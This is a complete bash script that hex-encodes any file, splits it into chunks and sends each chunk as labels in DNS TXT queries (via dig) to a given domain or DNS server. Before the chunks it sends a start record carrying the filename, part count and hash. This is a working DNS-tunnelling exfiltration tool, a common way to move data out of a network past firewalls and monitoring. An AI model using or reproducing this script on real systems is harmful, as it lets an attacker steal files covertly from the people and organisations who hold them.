#!/bin/bash

# Script to break a file into chunks and send via DNS queries
# Usage: ./script.sh <file> [domain] [chunk_size] [dns_server]

set -e

if [ $# -lt 1 ]; then
    echo "Usage: $0 <file> [domain] [chunk_size] [dns_server]"
    echo "  file: File to transfer"
    echo "  domain: Domain suffix (default: example.com)"
    echo "  chunk_size: Size of each chunk in bytes (default: 100)"
    echo "  dns_server: DNS server IP (default: system default)"
    exit 1
fi

FILE="$1"
DOMAIN="${2:-example.com}"
CHUNK_SIZE="${3:-100}"
DNS_SERVER="${4:-}"

# Check if file exists
if [ ! -f "$FILE" ]; then
    echo "Error: File '$FILE' not found"
    exit 1
fi

# Get filename (basename only)
FILENAME=$(basename "$FILE")

# Generate hash8 (8 hex characters) - using first 8 chars of file's md5
HASH8=$(md5sum "$FILE" | cut -d' ' -f1 | cut -c1-8)

# Encode filename to hex
FILENAME_HEX=$(echo -n "$FILENAME" | xxd -p | tr -d '\n')

# Get file size
FILE_SIZE=$(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE" 2>/dev/null || wc -c < "$FILE")

# Calculate total parts
TOTAL_PARTS=$(( (FILE_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE ))

echo "File: $FILE"
echo "Filename: $FILENAME"
echo "Size: $FILE_SIZE bytes"
echo "Chunk size: $CHUNK_SIZE bytes"
echo "Total parts: $TOTAL_PARTS"
echo "Hash: $HASH8"
echo "Domain: $DOMAIN"
echo ""

# Function to split hex string into DNS labels (max 63 chars per label)
split_hex_labels() {
    local hex_str="$1"
    local result=""
    local len=${#hex_str}
    local i=0
    
    while [ $i -lt $len ]; do
        if [ -n "$result" ]; then
            result="${result}."
        fi
        result="${result}${hex_str:$i:63}"
        i=$((i + 63))
    done
    
    echo "$result"
}

# Build start record query
# Format: filename_hex.total_parts.chunk_size.start.hash8.<domain>
FILENAME_HEX_LABELS=$(split_hex_labels "$FILENAME_HEX")
START_QUERY="${FILENAME_HEX_LABELS}.${TOTAL_PARTS}.${CHUNK_SIZE}.start.${HASH8}.${DOMAIN}"

echo "Sending start record..."
if [ -z "$DNS_SERVER" ]; then
    dig +short "$START_QUERY" TXT > /dev/null 2>&1 || true
else
    dig +short @"$DNS_SERVER" "$START_QUERY" TXT > /dev/null 2>&1 || true
fi
sleep 0.1

# Read file and send chunks
PART_NUM=0
BYTES_READ=0

while [ $BYTES_READ -lt $FILE_SIZE ]; do
    # Read chunk and encode to hex in one step (avoid null byte warning)
    CHUNK_HEX=$(dd if="$FILE" bs=1 skip=$BYTES_READ count=$CHUNK_SIZE 2>/dev/null | xxd -p | tr -d '\n')
    
    # Split hex into DNS labels
    CHUNK_HEX_LABELS=$(split_hex_labels "$CHUNK_HEX")
    
    # Build data record query
    # Format: data_hex.part_num.hash8.<domain>
    DATA_QUERY="${CHUNK_HEX_LABELS}.${PART_NUM}.${HASH8}.${DOMAIN}"
    
    # Send DNS query
    echo -n "Sending part $PART_NUM/$((TOTAL_PARTS - 1))... "
    if [ -z "$DNS_SERVER" ]; then
        dig +short "$DATA_QUERY" TXT > /dev/null 2>&1 || true
    else
        dig +short @"$DNS_SERVER" "$DATA_QUERY" TXT > /dev/null 2>&1 || true
    fi
    echo "done"
    
    BYTES_READ=$((BYTES_READ + CHUNK_SIZE))
    PART_NUM=$((PART_NUM + 1))
    
    # Small delay to avoid overwhelming the DNS server
    sleep 0.05
done

echo ""
echo "Transfer complete! Sent $TOTAL_PARTS parts."
echo "File should be received as: $FILENAME"

